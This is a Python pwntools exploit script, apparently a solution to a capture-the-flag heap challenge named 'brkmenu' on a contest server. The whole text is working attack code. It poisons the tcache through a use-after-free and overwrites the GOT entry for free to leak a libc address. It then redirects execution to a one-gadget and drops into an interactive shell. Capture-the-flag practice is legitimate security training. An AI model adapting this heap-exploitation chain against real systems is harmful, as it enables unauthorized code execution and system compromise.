from pwn import *

BEDUG = False

elf = ELF('./brkmenu_patched')
libc = ELF('./libc.so.6')

if BEDUG==True:
    io = process('./brkmenu')
    gdb.attach(io)
else:
    io = remote('breakfast.sdc.tf', 1337)

def add():
    io.sendlineafter(b'4. Pay your bill and leave\n', b'1')

def edit(idx, dat):
    io.sendlineafter(b'4. Pay your bill and leave\n', b'2')
    io.sendlineafter(b'like to modify\n', str(idx).encode('utf-8'))
    io.sendafter(b'like to order?\n', dat)
    
def rm(idx):
    io.sendlineafter(b'4. Pay your bill and leave\n', b'3')
    io.sendlineafter(b'like to remove\n', str(idx).encode('utf-8'))

add() #0
add() #1
rm(1)
rm(0)
edit(0, p64(0x602098)+b'\n')
add() #2
add() #3
edit(3, p64(0x602028)+b'\n')

add() #4
add() #5
rm(5)
rm(4)
edit(4, p64(elf.got['free']-8)+b'\n')
add() #6
add() #7
edit(7, b'AAAAAAAA'+p64(elf.sym['puts'])+b'\n')
rm(-9)
libc.address = u64(io.recv(6)+b'\0\0') - libc.sym['puts']
log.info('Libc: '+hex(libc.address))
og = libc.address + 0x10a2fc
edit(7, b'AAAAAAAA'+p64(og)+b'\n')
rm(-3)
io.interactive()
